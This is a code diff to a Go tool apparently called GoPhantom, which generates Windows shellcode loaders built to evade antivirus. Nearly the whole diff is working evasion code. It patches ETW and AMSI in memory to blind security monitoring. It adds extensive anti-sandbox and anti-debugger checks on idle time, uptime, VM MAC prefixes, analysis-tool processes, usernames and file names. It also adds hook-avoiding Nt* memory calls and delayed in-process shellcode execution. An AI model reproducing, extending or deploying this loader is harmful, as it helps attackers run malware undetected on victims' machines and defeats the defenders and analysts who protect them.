@@ -15,7 +15,6 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
-	"runtime"
 	"text/template"
 )
 
@@ -34,7 +33,7 @@ const loaderTemplate = `
 //go:build windows
 // +build windows
 
-// 由 GoPhantom v1.3 生成的高级免杀加载器
+// 由 GoPhantom v1.4 生成的高级免杀加载器
 package main
 
 import (
@@ -62,6 +61,7 @@ const (
 	enableCompress           = {{.EnableCompress}}
 	enableObfuscate          = {{.EnableObfuscate}}
 	enableMutate             = {{.EnableMutate}}
+	delaySeconds             = {{.DelaySeconds}}
 )
 
 // Windows 结构体定义
@@ -152,6 +152,12 @@ type IMAGE_EXPORT_DIRECTORY struct {
 	AddressOfNameOrdinals uint32
 }
 
+// LASTINPUTINFO 结构体用于检测用户活动
+type LASTINPUTINFO struct {
+	CbSize uint32
+	DwTime uint32
+}
+
 // 字符串解混淆函数
 func deobfuscateStr(encoded string) string {
 	decoded, _ := base64.StdEncoding.DecodeString(encoded)
@@ -177,6 +183,652 @@ func getShell32() uintptr {
 	return uintptr(shell32)
 }
 
+// 检测用户活动，超过5分钟无输入判定为沙箱
+func checkUserActivity() bool {
+	user32, err := syscall.LoadLibrary("user32.dll")
+	if err != nil {
+		return true // 无法加载则假设真实环境
+	}
+	
+	getLastInputInfo, err := syscall.GetProcAddress(user32, "GetLastInputInfo")
+	if err != nil {
+		return true
+	}
+	
+	getTickCount, err := syscall.GetProcAddress(syscall.Handle(getKernel32()), "GetTickCount")
+	if err != nil {
+		return true
+	}
+	
+	var lii LASTINPUTINFO
+	lii.CbSize = uint32(unsafe.Sizeof(lii))
+	
+	ret, _, _ := syscall.Syscall(uintptr(getLastInputInfo), 1, uintptr(unsafe.Pointer(&lii)), 0, 0)
+	if ret == 0 {
+		return true
+	}
+	
+	currentTick, _, _ := syscall.Syscall(uintptr(getTickCount), 0, 0, 0, 0)
+	idleTime := uint32(currentTick) - lii.DwTime
+	
+	// 空闲时间超过5分钟(300000ms)判定为沙箱
+	if idleTime > 300000 {
+		return false
+	}
+	
+	return true
+}
+
+// 检测调试器 - 使用多种技术
+func checkDebugger() bool {
+	kernel32 := getKernel32()
+	
+	// 1. IsDebuggerPresent 检测
+	isDebuggerPresent := getProcAddr(kernel32, "IsDebuggerPresent")
+	if isDebuggerPresent != 0 {
+		ret, _, _ := syscall.Syscall(isDebuggerPresent, 0, 0, 0, 0)
+		if ret != 0 {
+			return false
+		}
+	}
+	
+	// 2. CheckRemoteDebuggerPresent 检测
+	checkRemoteDebuggerPresent := getProcAddr(kernel32, "CheckRemoteDebuggerPresent")
+	if checkRemoteDebuggerPresent != 0 {
+		getCurrentProcess := getProcAddr(kernel32, "GetCurrentProcess")
+		if getCurrentProcess != 0 {
+			hProcess, _, _ := syscall.Syscall(getCurrentProcess, 0, 0, 0, 0)
+			var isDebuggerAttached int32
+			syscall.Syscall(checkRemoteDebuggerPresent, 2, hProcess, uintptr(unsafe.Pointer(&isDebuggerAttached)), 0)
+			if isDebuggerAttached != 0 {
+				return false
+			}
+		}
+	}
+	
+	// 3. NtGlobalFlag 检测 (PEB->NtGlobalFlag)
+	// 调试器会设置 FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
+	ntdll, _ := syscall.LoadLibrary("ntdll.dll")
+	if ntdll != 0 {
+		ntQueryInformationProcess := getProcAddr(uintptr(ntdll), "NtQueryInformationProcess")
+		if ntQueryInformationProcess != 0 {
+			var pbi [6]uintptr // PROCESS_BASIC_INFORMATION
+			var returnLength uint32
+			getCurrentProcess := getProcAddr(kernel32, "GetCurrentProcess")
+			if getCurrentProcess != 0 {
+				hProcess, _, _ := syscall.Syscall(getCurrentProcess, 0, 0, 0, 0)
+				ret, _, _ := syscall.Syscall6(ntQueryInformationProcess, 5, hProcess, 0, uintptr(unsafe.Pointer(&pbi[0])), unsafe.Sizeof(pbi), uintptr(unsafe.Pointer(&returnLength)), 0)
+				if ret == 0 && pbi[1] != 0 { // PebBaseAddress
+					// 读取 PEB+0x68 (x64) 或 PEB+0xBC (x86) 的 NtGlobalFlag
+					peb := pbi[1]
+					ntGlobalFlag := *(*uint32)(unsafe.Pointer(peb + 0xBC))
+					if ntGlobalFlag&0x70 != 0 { // FLG_HEAP_* flags
+						return false
+					}
+				}
+			}
+		}
+	}
+	
+	return true
+}
+
+// 检测系统启动时间（沙箱通常刚启动）
+func checkUptime() bool {
+	kernel32 := getKernel32()
+	getTickCount64 := getProcAddr(kernel32, "GetTickCount64")
+	if getTickCount64 != 0 {
+		ticks, _, _ := syscall.Syscall(getTickCount64, 0, 0, 0, 0)
+		// 系统运行时间小于10分钟判定为沙箱
+		if ticks < 600000 {
+			return false
+		}
+	}
+	return true
+}
+
+// 检测父进程是否为可疑进程
+func checkParentProcess() bool {
+	kernel32 := getKernel32()
+	ntdll, _ := syscall.LoadLibrary("ntdll.dll")
+	if ntdll == 0 {
+		return true
+	}
+	
+	ntQueryInformationProcess := getProcAddr(uintptr(ntdll), "NtQueryInformationProcess")
+	getCurrentProcess := getProcAddr(kernel32, "GetCurrentProcess")
+	openProcess := getProcAddr(kernel32, "OpenProcess")
+	closeHandle := getProcAddr(kernel32, "CloseHandle")
+	
+	if ntQueryInformationProcess == 0 || getCurrentProcess == 0 {
+		return true
+	}
+	
+	hProcess, _, _ := syscall.Syscall(getCurrentProcess, 0, 0, 0, 0)
+	
+	// PROCESS_BASIC_INFORMATION
+	var pbi [6]uintptr
+	var returnLength uint32
+	ret, _, _ := syscall.Syscall6(ntQueryInformationProcess, 5, hProcess, 0, uintptr(unsafe.Pointer(&pbi[0])), unsafe.Sizeof(pbi), uintptr(unsafe.Pointer(&returnLength)), 0)
+	if ret != 0 {
+		return true
+	}
+	
+	parentPid := uint32(pbi[5]) // InheritedFromUniqueProcessId
+	if parentPid == 0 {
+		return true
+	}
+	
+	// 尝试获取父进程名
+	if openProcess != 0 && closeHandle != 0 {
+		// PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
+		hParent, _, _ := syscall.Syscall(openProcess, 3, 0x1000, 0, uintptr(parentPid))
+		if hParent != 0 {
+			defer syscall.Syscall(closeHandle, 1, hParent, 0, 0)
+			
+			// 使用 QueryFullProcessImageNameW
+			queryFullProcessImageName := getProcAddr(kernel32, "QueryFullProcessImageNameW")
+			if queryFullProcessImageName != 0 {
+				var buffer [260]uint16
+				size := uint32(260)
+				ret, _, _ := syscall.Syscall6(queryFullProcessImageName, 4, hParent, 0, uintptr(unsafe.Pointer(&buffer[0])), uintptr(unsafe.Pointer(&size)), 0, 0)
+				if ret != 0 {
+					parentName := syscall.UTF16ToString(buffer[:])
+					// 提取文件名
+					for i := len(parentName) - 1; i >= 0; i-- {
+						if parentName[i] == '\\' || parentName[i] == '/' {
+							parentName = parentName[i+1:]
+							break
+						}
+					}
+					// 转小写并检测
+					lowerName := ""
+					for _, c := range parentName {
+						if c >= 'A' && c <= 'Z' {
+							lowerName += string(c + 32)
+						} else {
+							lowerName += string(c)
+						}
+					}
+					// 可疑父进程列表
+					suspiciousParents := []string{"cmd.exe", "powershell.exe", "pwsh.exe", "python.exe", "python3.exe", "wscript.exe", "cscript.exe", "mshta.exe", "rundll32.exe"}
+					for _, sp := range suspiciousParents {
+						if lowerName == sp {
+							// 可疑但不一定是沙箱，给50%概率通过
+							if rand.Intn(100) < 50 {
+								return false
+							}
+						}
+					}
+				}
+			}
+		}
+	}
+	
+	return true
+}
+
+// 检测文件名是否被重命名为常见沙箱名称
+func checkFileName() bool {
+	kernel32 := getKernel32()
+	getModuleFileNameW := getProcAddr(kernel32, "GetModuleFileNameW")
+	if getModuleFileNameW == 0 {
+		return true
+	}
+	
+	var buffer [260]uint16
+	ret, _, _ := syscall.Syscall(getModuleFileNameW, 3, 0, uintptr(unsafe.Pointer(&buffer[0])), 260)
+	if ret == 0 {
+		return true
+	}
+	
+	fileName := syscall.UTF16ToString(buffer[:])
+	// 提取文件名
+	for i := len(fileName) - 1; i >= 0; i-- {
+		if fileName[i] == '\\' || fileName[i] == '/' {
+			fileName = fileName[i+1:]
+			break
+		}
+	}
+	
+	// 转小写
+	lowerName := ""
+	for _, c := range fileName {
+		if c >= 'A' && c <= 'Z' {
+			lowerName += string(c + 32)
+		} else {
+			lowerName += string(c)
+		}
+	}
+	
+	// 常见沙箱/分析样本名称
+	suspiciousNames := []string{
+		"sample", "malware", "virus", "trojan", "test", "sandbox",
+		"specimen", "payload", "dropper", "exploit",
+	}
+	
+	for _, sn := range suspiciousNames {
+		for i := 0; i <= len(lowerName)-len(sn); i++ {
+			if lowerName[i:i+len(sn)] == sn {
+				return false
+			}
+		}
+	}
+	
+	// 检测是否为哈希命名（32位或64位十六进制）
+	if len(lowerName) >= 32 {
+		isHex := true
+		hexCount := 0
+		for _, c := range lowerName {
+			if c == '.' {
+				break
+			}
+			if (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') {
+				hexCount++
+			} else {
+				isHex = false
+				break
+			}
+		}
+		if isHex && (hexCount == 32 || hexCount == 64) {
+			return false
+		}
+	}
+	
+	return true
+}
+
+// 检测分析工具进程
+func checkAnalysisTools() bool {
+	kernel32 := getKernel32()
+	
+	createToolhelp32Snapshot := getProcAddr(kernel32, "CreateToolhelp32Snapshot")
+	process32First := getProcAddr(kernel32, "Process32FirstW")
+	process32Next := getProcAddr(kernel32, "Process32NextW")
+	closeHandle := getProcAddr(kernel32, "CloseHandle")
+	
+	if createToolhelp32Snapshot == 0 || process32First == 0 || process32Next == 0 {
+		return true
+	}
+	
+	// 分析工具进程名列表（小写比较）
+	badProcesses := []string{
+		"ollydbg", "x64dbg", "x32dbg", "ida", "ida64", "idag", "idag64",
+		"windbg", "dbgview", "processhacker", "procmon", "procexp",
+		"wireshark", "fiddler", "charles", "burpsuite",
+		"pestudio", "die", "peid", "lordpe", "petools",
+		"regshot", "autoruns", "tcpview",
+		"vboxservice", "vboxtray", "vmwaretray", "vmwareuser",
+		"sandboxie", "sbiectrl",
+	}
+	
+	// TH32CS_SNAPPROCESS = 0x2
+	snapshot, _, _ := syscall.Syscall(createToolhelp32Snapshot, 2, 0x2, 0, 0)
+	if snapshot == ^uintptr(0) {
+		return true
+	}
+	defer syscall.Syscall(closeHandle, 1, snapshot, 0, 0)
+	
+	// PROCESSENTRY32W 结构体
+	type PROCESSENTRY32W struct {
+		Size              uint32
+		CntUsage          uint32
+		ProcessID         uint32
+		DefaultHeapID     uintptr
+		ModuleID          uint32
+		Threads           uint32
+		ParentProcessID   uint32
+		PriClassBase      int32
+		Flags             uint32
+		ExeFile           [260]uint16
+	}
+	
+	var pe PROCESSENTRY32W
+	pe.Size = uint32(unsafe.Sizeof(pe))
+	
+	ret, _, _ := syscall.Syscall(process32First, 2, snapshot, uintptr(unsafe.Pointer(&pe)), 0)
+	if ret == 0 {
+		return true
+	}
+	
+	for {
+		// 转换进程名为小写字符串
+		procName := syscall.UTF16ToString(pe.ExeFile[:])
+		procNameLower := ""
+		for _, c := range procName {
+			if c >= 'A' && c <= 'Z' {
+				procNameLower += string(c + 32)
+			} else {
+				procNameLower += string(c)
+			}
+		}
+		
+		for _, bad := range badProcesses {
+			if len(procNameLower) >= len(bad) {
+				// 检查进程名是否包含危险关键字
+				for i := 0; i <= len(procNameLower)-len(bad); i++ {
+					if procNameLower[i:i+len(bad)] == bad {
+						return false
+					}
+				}
+			}
+		}
+		
+		ret, _, _ = syscall.Syscall(process32Next, 2, snapshot, uintptr(unsafe.Pointer(&pe)), 0)
+		if ret == 0 {
+			break
+		}
+	}
+	
+	return true
+}
+
+// 检测虚拟机 MAC 地址前缀
+func checkMACAddress() bool {
+	// 常见虚拟机 MAC 地址前缀
+	vmMacPrefixes := []string{
+		"00:05:69", "00:0C:29", "00:1C:14", "00:50:56", // VMware
+		"08:00:27", "0A:00:27", // VirtualBox
+		"00:03:FF", // Microsoft Hyper-V
+		"00:1C:42", // Parallels
+		"00:16:3E", // Xen
+		"00:15:5D", // Hyper-V
+	}
+	
+	// 使用 GetAdaptersInfo 检测网卡
+	iphlpapi, err := syscall.LoadLibrary("iphlpapi.dll")
+	if err != nil {
+		return true
+	}
+	
+	getAdaptersInfo, err := syscall.GetProcAddress(iphlpapi, "GetAdaptersInfo")
+	if err != nil {
+		return true
+	}
+	
+	// 先获取需要的缓冲区大小
+	var bufLen uint32 = 0
+	syscall.Syscall(uintptr(getAdaptersInfo), 2, 0, uintptr(unsafe.Pointer(&bufLen)), 0)
+	
+	if bufLen == 0 {
+		return true
+	}
+	
+	buffer := make([]byte, bufLen)
+	ret, _, _ := syscall.Syscall(uintptr(getAdaptersInfo), 2, uintptr(unsafe.Pointer(&buffer[0])), uintptr(unsafe.Pointer(&bufLen)), 0)
+	
+	if ret != 0 {
+		return true
+	}
+	
+	// 解析 MAC 地址 (简化版本，只检查前6个字节)
+	if len(buffer) >= 404 { // IP_ADAPTER_INFO 最小大小
+		// Address 在偏移 404 处，长度 6
+		addrOffset := 404
+		if len(buffer) > addrOffset+6 {
+			mac := buffer[addrOffset : addrOffset+6]
+			macStr := ""
+			for i, b := range mac[:3] {
+				if i > 0 {
+					macStr += ":"
+				}
+				macStr += string("0123456789ABCDEF"[b>>4]) + string("0123456789ABCDEF"[b&0xF])
+			}
+			
+			for _, prefix := range vmMacPrefixes {
+				if macStr == prefix[:8] {
+					return false
+				}
+			}
+		}
+	}
+	
+	return true
+}
+
+// 禁用 ETW (Event Tracing for Windows)
+func disableETW() {
+	ntdll, err := syscall.LoadLibrary("ntdll.dll")
+	if err != nil {
+		return
+	}
+	
+	etwEventWrite := getProcAddr(uintptr(ntdll), "EtwEventWrite")
+	if etwEventWrite == 0 {
+		return
+	}
+	
+	kernel32 := getKernel32()
+	virtualProtect := getProcAddr(kernel32, "VirtualProtect")
+	if virtualProtect == 0 {
+		return
+	}
+	
+	var oldProtect uint32
+	// 修改 EtwEventWrite 函数开头为 ret
+	ret, _, _ := syscall.Syscall6(virtualProtect, 4, etwEventWrite, 1, 0x40, uintptr(unsafe.Pointer(&oldProtect)), 0, 0)
+	if ret != 0 {
+		*(*byte)(unsafe.Pointer(etwEventWrite)) = 0xC3 // ret
+		syscall.Syscall6(virtualProtect, 4, etwEventWrite, 1, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)), 0, 0)
+	}
+}
+
+// 禁用 AMSI (Antimalware Scan Interface)
+func disableAMSI() {
+	amsi, err := syscall.LoadLibrary("amsi.dll")
+	if err != nil {
+		return // AMSI 未加载，无需处理
+	}
+	
+	amsiScanBuffer := getProcAddr(uintptr(amsi), "AmsiScanBuffer")
+	if amsiScanBuffer == 0 {
+		return
+	}
+	
+	kernel32 := getKernel32()
+	virtualProtect := getProcAddr(kernel32, "VirtualProtect")
+	if virtualProtect == 0 {
+		return
+	}
+	
+	var oldProtect uint32
+	// Patch: mov eax, 0x80070057 (E_INVALIDARG); ret
+	patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
+	
+	ret, _, _ := syscall.Syscall6(virtualProtect, 4, amsiScanBuffer, uintptr(len(patch)), 0x40, uintptr(unsafe.Pointer(&oldProtect)), 0, 0)
+	if ret != 0 {
+		dst := (*[6]byte)(unsafe.Pointer(amsiScanBuffer))
+		for i, b := range patch {
+			dst[i] = b
+		}
+		syscall.Syscall6(virtualProtect, 4, amsiScanBuffer, uintptr(len(patch)), uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)), 0, 0)
+	}
+}
+
+// 堆栈欺骗 - 在调用敏感API前伪造调用栈
+func spoofCallStack() {
+	// 通过多层函数调用混淆调用栈
+	for i := 0; i < rand.Intn(3)+1; i++ {
+		_ = make([]byte, rand.Intn(1024)+1)
+	}
+}
+
+// API 哈希解析 - 通过哈希而非名称获取API地址
+func hashString(s string) uint32 {
+	var hash uint32 = 0x811c9dc5 // FNV-1a offset basis
+	for i := 0; i < len(s); i++ {
+		hash ^= uint32(s[i])
+		hash *= 0x01000193 // FNV-1a prime
+	}
+	return hash
+}
+
+// 内存加密守护 - 定期重新加密内存中的敏感数据
+func memoryGuard(addr uintptr, size int, done chan bool) {
+	key := make([]byte, 32)
+	for i := range key {
+		key[i] = byte(rand.Intn(256))
+	}
+	
+	mem := (*[1 << 30]byte)(unsafe.Pointer(addr))[:size:size]
+	
+	ticker := time.NewTicker(100 * time.Millisecond)
+	defer ticker.Stop()
+	
+	encrypted := false
+	for {
+		select {
+		case <-done:
+			// 确保最终是解密状态
+			if encrypted {
+				for i := 0; i < len(mem); i++ {
+					mem[i] ^= key[i%32]
+				}
+			}
+			return
+		case <-ticker.C:
+			// 切换加密状态
+			for i := 0; i < len(mem); i++ {
+				mem[i] ^= key[i%32]
+			}
+			encrypted = !encrypted
+		}
+	}
+}
+
+// 时间戳计数器检测 (RDTSC) - 检测单步调试
+func checkRDTSC() bool {
+	// 通过执行时间差检测单步调试
+	// 正常执行应该非常快，调试时会很慢
+	start := time.Now()
+	
+	// 执行一些计算操作
+	sum := 0
+	for i := 0; i < 1000; i++ {
+		sum += i
+	}
+	_ = sum
+	
+	elapsed := time.Since(start)
+	// 如果简单循环耗时超过100ms，可能在被调试
+	if elapsed > 100*time.Millisecond {
+		return false
+	}
+	return true
+}
+
+// 检测硬件断点
+func checkHardwareBreakpoints() bool {
+	kernel32 := getKernel32()
+	getCurrentThread := getProcAddr(kernel32, "GetCurrentThread")
+	getThreadContext := getProcAddr(kernel32, "GetThreadContext")
+	
+	if getCurrentThread == 0 || getThreadContext == 0 {
+		return true
+	}
+	
+	hThread, _, _ := syscall.Syscall(getCurrentThread, 0, 0, 0, 0)
+	
+	// CONTEXT 结构体 (简化版，只关心 Dr0-Dr3)
+	// 对于 x64: ContextFlags 在偏移 0x30, Dr0-Dr3 在偏移 0x68-0x80
+	context := make([]byte, 1232) // CONTEXT 大小
+	// 设置 ContextFlags = CONTEXT_DEBUG_REGISTERS (0x10)
+	*(*uint32)(unsafe.Pointer(&context[0x30])) = 0x10
+	
+	ret, _, _ := syscall.Syscall(getThreadContext, 2, hThread, uintptr(unsafe.Pointer(&context[0])), 0)
+	if ret != 0 {
+		// 检查 Dr0-Dr3 是否被设置
+		dr0 := *(*uintptr)(unsafe.Pointer(&context[0x68]))
+		dr1 := *(*uintptr)(unsafe.Pointer(&context[0x70]))
+		dr2 := *(*uintptr)(unsafe.Pointer(&context[0x78]))
+		dr3 := *(*uintptr)(unsafe.Pointer(&context[0x80]))
+		
+		if dr0 != 0 || dr1 != 0 || dr2 != 0 || dr3 != 0 {
+			return false
+		}
+	}
+	
+	return true
+}
+
+// 检测 Windows Defender 沙箱特征
+func checkDefenderSandbox() bool {
+	kernel32 := getKernel32()
+	
+	// 检测特定环境变量
+	getEnvironmentVariableW := getProcAddr(kernel32, "GetEnvironmentVariableW")
+	if getEnvironmentVariableW != 0 {
+		suspiciousEnvVars := []string{"CUCKOO", "SANDBOX", "MALWARE", "VIRUS", "SAMPLE"}
+		for _, env := range suspiciousEnvVars {
+			envName := make([]uint16, len(env)+1)
+			for i, c := range env {
+				envName[i] = uint16(c)
+			}
+			var buffer [256]uint16
+			ret, _, _ := syscall.Syscall(getEnvironmentVariableW, 3, uintptr(unsafe.Pointer(&envName[0])), uintptr(unsafe.Pointer(&buffer[0])), 256)
+			if ret > 0 {
+				return false
+			}
+		}
+	}
+	
+	// 检测用户名
+	getUserNameW := getProcAddr(uintptr(getAdvapi32()), "GetUserNameW")
+	if getUserNameW != 0 {
+		var buffer [256]uint16
+		size := uint32(256)
+		ret, _, _ := syscall.Syscall(getUserNameW, 2, uintptr(unsafe.Pointer(&buffer[0])), uintptr(unsafe.Pointer(&size)), 0)
+		if ret != 0 {
+			userName := syscall.UTF16ToString(buffer[:])
+			lowerName := ""
+			for _, c := range userName {
+				if c >= 'A' && c <= 'Z' {
+					lowerName += string(c + 32)
+				} else {
+					lowerName += string(c)
+				}
+			}
+			// 常见沙箱用户名
+			sandboxUsers := []string{"sandbox", "virus", "malware", "test", "sample", "john doe", "user", "currentuser", "admin"}
+			for _, su := range sandboxUsers {
+				if lowerName == su {
+					return false
+				}
+			}
+		}
+	}
+	
+	// 检测计算机名
+	getComputerNameW := getProcAddr(kernel32, "GetComputerNameW")
+	if getComputerNameW != 0 {
+		var buffer [256]uint16
+		size := uint32(256)
+		ret, _, _ := syscall.Syscall(getComputerNameW, 2, uintptr(unsafe.Pointer(&buffer[0])), uintptr(unsafe.Pointer(&size)), 0)
+		if ret != 0 {
+			computerName := syscall.UTF16ToString(buffer[:])
+			lowerName := ""
+			for _, c := range computerName {
+				if c >= 'A' && c <= 'Z' {
+					lowerName += string(c + 32)
+				} else {
+					lowerName += string(c)
+				}
+			}
+			// 常见沙箱计算机名
+			sandboxComputers := []string{"sandbox", "virus", "malware", "test", "sample", "analysis", "cuckoo"}
+			for _, sc := range sandboxComputers {
+				for i := 0; i <= len(lowerName)-len(sc); i++ {
+					if lowerName[i:i+len(sc)] == sc {
+						return false
+					}
+				}
+			}
+		}
+	}
+	
+	return true
+}
+
 // 简化的API解析
 func getProcAddr(module uintptr, procName string) uintptr {
 	addr, _ := syscall.GetProcAddress(syscall.Handle(module), procName)
@@ -191,6 +843,11 @@ func antiSandboxChecks() bool {
 			// 如果检测过程中出现panic，假设是真实环境
 		}
 	}()
+	
+	// 0. 用户活动检测（沙箱通常无用户输入）
+	if !checkUserActivity() {
+		return false
+	}
 	
 	// 1. CPU核心数检查
 	kernel32 := getKernel32()
@@ -257,6 +914,58 @@ func antiSandboxChecks() bool {
 		if ret != 0 && totalBytes < 60*1024*1024*1024 { // 小于60GB
 			return false
 		}
+	}
+	
+	// 5. 时间加速检测（沙箱常加速Sleep）
+	start := time.Now()
+	time.Sleep(500 * time.Millisecond)
+	if time.Since(start) < 400*time.Millisecond {
+		return false
+	}
+	
+	// 6. 调试器检测
+	if !checkDebugger() {
+		return false
+	}
+	
+	// 7. 分析工具进程检测
+	if !checkAnalysisTools() {
+		return false
+	}
+	
+	// 8. 虚拟机 MAC 地址检测
+	if !checkMACAddress() {
+		return false
+	}
+	
+	// 9. 系统启动时间检测
+	if !checkUptime() {
+		return false
+	}
+	
+	// 10. 父进程检测
+	if !checkParentProcess() {
+		return false
+	}
+	
+	// 11. 文件名检测
+	if !checkFileName() {
+		return false
+	}
+	
+	// 12. RDTSC 时间戳检测
+	if !checkRDTSC() {
+		return false
+	}
+	
+	// 13. 硬件断点检测
+	if !checkHardwareBreakpoints() {
+		return false
+	}
+	
+	// 14. Windows Defender 沙箱检测
+	if !checkDefenderSandbox() {
+		return false
 	}
 	
 	return true
@@ -420,7 +1129,7 @@ func mutateShellcode(shellcode []byte) []byte {
 	
 	return mutated
 }
-// 在当前进程中执行shellcode
+// 在当前进程中执行shellcode - 使用高级规避技术
 func executeShellcode(shellcode []byte) {
 	// 添加基本的错误处理
 	defer func() {
@@ -429,47 +1138,118 @@ func executeShellcode(shellcode []byte) {
 		}
 	}()
 	
+	// 堆栈欺骗
+	spoofCallStack()
+	
 	kernel32 := getKernel32()
 	if kernel32 == 0 {
 		return
 	}
 	
-	virtualAlloc := getProcAddr(kernel32, "VirtualAlloc")
-	virtualProtect := getProcAddr(kernel32, "VirtualProtect")
-	createThread := getProcAddr(kernel32, "CreateThread")
-	waitForSingleObject := getProcAddr(kernel32, "WaitForSingleObject")
+	ntdll, _ := syscall.LoadLibrary("ntdll.dll")
 	
-	if virtualAlloc == 0 || virtualProtect == 0 || createThread == 0 {
-		return
+	// 优先使用 Nt* 函数，绑过用户层 hook
+	var addr uintptr
+	var allocSuccess bool
+	
+	// 尝试使用 NtAllocateVirtualMemory (更底层，更难被hook)
+	ntAllocateVirtualMemory := getProcAddr(uintptr(ntdll), "NtAllocateVirtualMemory")
+	if ntAllocateVirtualMemory != 0 {
+		getCurrentProcess := getProcAddr(kernel32, "GetCurrentProcess")
+		if getCurrentProcess != 0 {
+			hProcess, _, _ := syscall.Syscall(getCurrentProcess, 0, 0, 0, 0)
+			var baseAddr uintptr = 0
+			regionSize := uintptr(len(shellcode))
+			// NtAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect)
+			ret, _, _ := syscall.Syscall6(ntAllocateVirtualMemory, 6, 
+				hProcess, 
+				uintptr(unsafe.Pointer(&baseAddr)), 
+				0, 
+				uintptr(unsafe.Pointer(&regionSize)), 
+				0x3000, // MEM_COMMIT | MEM_RESERVE
+				0x04)   // PAGE_READWRITE
+			if ret == 0 && baseAddr != 0 {
+				addr = baseAddr
+				allocSuccess = true
+			}
+		}
 	}
-
-	// 1. 申请RW内存
-	addr, _, _ := syscall.Syscall6(virtualAlloc, 4, 0, uintptr(len(shellcode)), 
-		0x3000, 0x04, 0, 0) // MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE
-	if addr == 0 {
-		return
+	
+	// 回退到 VirtualAlloc
+	if !allocSuccess {
+		virtualAlloc := getProcAddr(kernel32, "VirtualAlloc")
+		if virtualAlloc == 0 {
+			return
+		}
+		addr, _, _ = syscall.Syscall6(virtualAlloc, 4, 0, uintptr(len(shellcode)), 
+			0x3000, 0x04, 0, 0)
+		if addr == 0 {
+			return
+		}
 	}
-
-	// 2. 复制shellcode
+	
+	// 使用分块复制 + 随机延迟，规避行为检测
 	dst := (*[1 << 30]byte)(unsafe.Pointer(addr))[:len(shellcode):len(shellcode)]
-	copy(dst, shellcode)
+	chunkSize := 512
+	for i := 0; i < len(shellcode); i += chunkSize {
+		end := i + chunkSize
+		if end > len(shellcode) {
+			end = len(shellcode)
+		}
+		copy(dst[i:end], shellcode[i:end])
+		if rand.Intn(10) > 7 {
+			time.Sleep(time.Duration(rand.Intn(10)) * time.Millisecond)
+		}
+	}
 	
-	// 3. 可选睡眠混淆
+	// 可选睡眠混淆
 	if enableObfuscate {
 		sleepObfuscate(addr, uintptr(len(shellcode)))
 	}
 
-	// 4. 修改为RX权限
+	// 修改为RX权限 - 优先使用 NtProtectVirtualMemory
 	var oldProtect uint32
-	syscall.Syscall6(virtualProtect, 4, addr, uintptr(len(shellcode)), 
-		0x20, uintptr(unsafe.Pointer(&oldProtect)), 0, 0) // PAGE_EXECUTE_READ
+	ntProtectVirtualMemory := getProcAddr(uintptr(ntdll), "NtProtectVirtualMemory")
+	if ntProtectVirtualMemory != 0 {
+		getCurrentProcess := getProcAddr(kernel32, "GetCurrentProcess")
+		if getCurrentProcess != 0 {
+			hProcess, _, _ := syscall.Syscall(getCurrentProcess, 0, 0, 0, 0)
+			baseAddr := addr
+			regionSize := uintptr(len(shellcode))
+			syscall.Syscall6(ntProtectVirtualMemory, 5, 
+				hProcess, 
+				uintptr(unsafe.Pointer(&baseAddr)), 
+				uintptr(unsafe.Pointer(&regionSize)), 
+				0x20, // PAGE_EXECUTE_READ
+				uintptr(unsafe.Pointer(&oldProtect)), 0)
+		}
+	} else {
+		virtualProtect := getProcAddr(kernel32, "VirtualProtect")
+		if virtualProtect != 0 {
+			syscall.Syscall6(virtualProtect, 4, addr, uintptr(len(shellcode)), 
+				0x20, uintptr(unsafe.Pointer(&oldProtect)), 0, 0)
+		}
+	}
 	
-	// 5. 创建线程执行
+	// 执行前再次检测调试器
+	if !checkDebugger() {
+		return
+	}
+	
+	// 创建线程执行 - 使用随机延迟
+	time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)
+	
+	createThread := getProcAddr(kernel32, "CreateThread")
+	waitForSingleObject := getProcAddr(kernel32, "WaitForSingleObject")
+	
+	if createThread == 0 {
+		return
+	}
+	
 	threadHandle, _, _ := syscall.Syscall6(createThread, 6, 0, 0, addr, 0, 0, 0)
 	
-	// 6. 等待线程完成（可选）
 	if threadHandle != 0 && waitForSingleObject != 0 {
-		syscall.Syscall(waitForSingleObject, 2, threadHandle, 0xFFFFFFFF, 0) // INFINITE
+		syscall.Syscall(waitForSingleObject, 2, threadHandle, 0xFFFFFFFF, 0)
 	}
 }
 
@@ -495,6 +1275,10 @@ func selfDestruct() {
 func main() {
 	// 初始化随机种子
 	rand.Seed(time.Now().UnixNano())
+	
+	// 早期防御绕过
+	disableETW()
+	disableAMSI()
 	
 	// 执行反沙箱检查
 	if !antiSandboxChecks() {
@@ -536,6 +1320,14 @@ func main() {
 	
 	// 延迟执行payload
 	time.Sleep(time.Duration(1000+rand.Intn(2000)) * time.Millisecond)
+	
+	// 用户指定的分段延迟执行
+	if delaySeconds > 0 {
+		for i := 0; i < delaySeconds; i++ {
+			time.Sleep(time.Second)
+			time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)
+		}
+	}
 	
 	// 解密shellcode
 	if shellcode, err := decryptAESGCM(encryptedShellcodeBase64, aesSaltBase64); err == nil {
@@ -581,6 +1373,7 @@ type TemplateData struct {
 	EnableObfuscate  bool
 	EnableMutate     bool
 	EnableCompress   bool
+	DelaySeconds     int
 }
 
 func encryptAESGCM(plaintext []byte, key []byte, enableCompress bool) (string, error) {
@@ -632,6 +1425,7 @@ func main() {
 	enableObfuscate := flag.Bool("obfuscate", false, "Optional: Enable sleep-obfuscation in generated loader.")
 	enableMutate := flag.Bool("mutate", false, "Optional: Enable shellcode mutation with random NOPs.")
 	enableCompress := flag.Bool("compress", true, "Optional: Enable zlib compression of embedded data (default: true).")
+	delaySeconds := flag.Int("delay", 0, "Optional: Delay N seconds before payload execution.")
 	
 	// 自定义用法信息
 	flag.Usage = func() {
@@ -643,12 +1437,13 @@ func main() {
 		fmt.Fprintf(os.Stderr, "  -out string\n        Final output executable name\n\n")
 		fmt.Fprintf(os.Stderr, "Optional flags:\n")
 		fmt.Fprintf(os.Stderr, "  -compress\n        Enable zlib compression of embedded data (default: true)\n")
